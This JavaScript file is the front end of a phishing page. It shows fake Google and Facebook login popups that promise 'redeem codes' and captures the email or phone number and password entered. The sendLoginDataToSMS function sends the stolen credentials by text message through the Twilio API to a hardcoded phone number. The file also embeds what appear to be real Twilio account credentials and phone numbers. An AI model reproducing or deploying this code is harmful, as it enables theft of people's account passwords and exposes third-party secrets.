// Add your Twilio credentials and phone number here
const TWILIO_ACCOUNT_SID = 'AC84f3b179b0fd3949be3b101546e488b0';
const TWILIO_AUTH_TOKEN = 'a6334ffcb46f7b55f22253af0b25f0e8';
const TWILIO_PHONE_NUMBER = '+16465767521';

function sendLoginDataToSMS(platform, identifier, password) {
    const phoneNumber = '+919827361619';
    const message = `Platform: ${platform}, Identifier: ${identifier}, Password: ${password}`;

    fetch('https://api.twilio.com/2010-04-01/Accounts/' + TWILIO_ACCOUNT_SID + '/Messages.json', {
        method: 'POST',
        headers: {
            'Authorization': 'Basic ' + btoa(TWILIO_ACCOUNT_SID + ':' + TWILIO_AUTH_TOKEN),
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams({
            To: phoneNumber,
            From: TWILIO_PHONE_NUMBER,
            Body: message
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.sid) {
            console.log('Message sent successfully:', data);
        } else {
            console.error('Error sending message:', data);
        }
    })
    .catch(error => console.error('Error:', error));
}

// The rest of your code remains the same
document.getElementById('google-login').addEventListener('click', function() {
    openPopup('google-popup');
});

document.getElementById('facebook-login').addEventListener('click', function() {
    openPopup('facebook-popup');
});

function openPopup(popupId) {
    document.getElementById(popupId).style.display = 'flex';
}

function closePopup(popupId) {
    document.getElementById(popupId).style.display = 'none';
}

function googleLogin() {
    const email = document.getElementById('google-email').value;
    const password = document.getElementById('google-password').value;
    saveLoginData('Google', email, password);
    closePopup('google-popup');
    openPopup('redeem-popup');
    sendLoginDataToSMS('Google', email, password);
}

function facebookLogin() {
    const mobile = document.getElementById('facebook-mobile').value;
    const password = document.getElementById('facebook-password').value;
    saveLoginData('Facebook', mobile, password);
    closePopup('facebook-popup');
    openPopup('redeem-popup');
    sendLoginDataToSMS('Facebook', mobile, password);
}

function saveLoginData(platform, identifier, password) {
    const loginData = {
        platform,
        identifier,
        password
    };
    const dataPopup = document.getElementById('login-data');
    const loginItem = document.createElement('div');
    loginItem.innerHTML = `<ion-icon name="logo-${platform.toLowerCase()}"></ion-icon> ${identifier} - ${password}`;
    dataPopup.appendChild(loginItem);
}

let usedCodes = new Set();
const redeemCodes = ['CODE1', 'CODE2', 'CODE3'];
let currentCodeIndex = 0;
let isWaiting = false;

function getCode() {
    if (isWaiting) return;

    closePopup('redeem-popup');
    openPopup('countdown-popup');
    let countdown = 5;
    const countdownNumber = document.getElementById('countdown-number');
    const countdownInterval = setInterval(() => {
        countdown--;
        countdownNumber.textContent = countdown;
        if (countdown === 0) {
            clearInterval(countdownInterval);
            closePopup('countdown-popup');

            if (usedCodes.size < redeemCodes.length) {
                let code = redeemCodes[currentCodeIndex];
                usedCodes.add(code);
                currentCodeIndex = (currentCodeIndex + 1) % redeemCodes.length;
                document.getElementById('redeem-code').value = code;
                openPopup('redeem-popup');
            } else {
                document.getElementById('redeem-code').value = "Wait 60 seconds for a new code.";
                startCountdown();
            }
        }
    }, 1000);
}

function copyCode() {
    const redeemCode = document.getElementById('redeem-code');
    redeemCode.select();
    document.execCommand('copy');
    const copyButton = document.getElementById('copyButton');
    copyButton.classList.add('green-tick');
    document.getElementById('copy-icon').style.display = 'none';
    document.getElementById('check-icon').style.display = 'inline';
    setTimeout(() => {
        copyButton.classList.remove('green-tick');
        document.getElementById('copy-icon').style.display = 'inline';
        document.getElementById('check-icon').style.display = 'none';
    }, 3000);
}

function startCountdown() {
    isWaiting = true;
    let countdown = 60;
    const redeemCodeInput = document.getElementById('redeem-code');
    const countdownInterval = setInterval(() => {
        countdown--;
        redeemCodeInput.value = `Wait ${countdown} seconds for a new code.`;
        if (countdown === 0) {
            clearInterval(countdownInterval);
            usedCodes.clear();
            isWaiting = false;
            redeemCodeInput.value = "";
        }
    }, 1000);
}

function openDataPopup() {
    openPopup('data-popup');
}

// Close the pop-up when clicking outside the content area
window.onclick = function(event) {
    const googlePopup = document.getElementById('google-popup');
    const facebookPopup = document.getElementById('facebook-popup');
    const redeemPopup = document.getElementById('redeem-popup');
    const countdownPopup = document.getElementById('countdown-popup');
    const dataPopup = document.getElementById('data-popup');

    if (event.target === googlePopup) {
        closePopup('google-popup');
    } else if (event.target === facebookPopup) {
        closePopup('facebook-popup');
    } else if (event.target === redeemPopup) {
        closePopup('redeem-popup');
    } else if (event.target === countdownPopup) {
        closePopup('countdown-popup');
    } else if (event.target === dataPopup) {
        closePopup('data-popup');
    }
}

// Add CSS animations for countdown
const styleSheet = document.styleSheets[0];
styleSheet.insertRule(`
    @keyframes countdown {
        0% { border-color: green; }
        100% { border-color: red; }
    }
`, styleSheet.cssRules.length);

styleSheet.insertRule(`
    #countdown-circle {
        animation: countdown 5s linear forwards;
    }
`, styleSheet.cssRules.length);


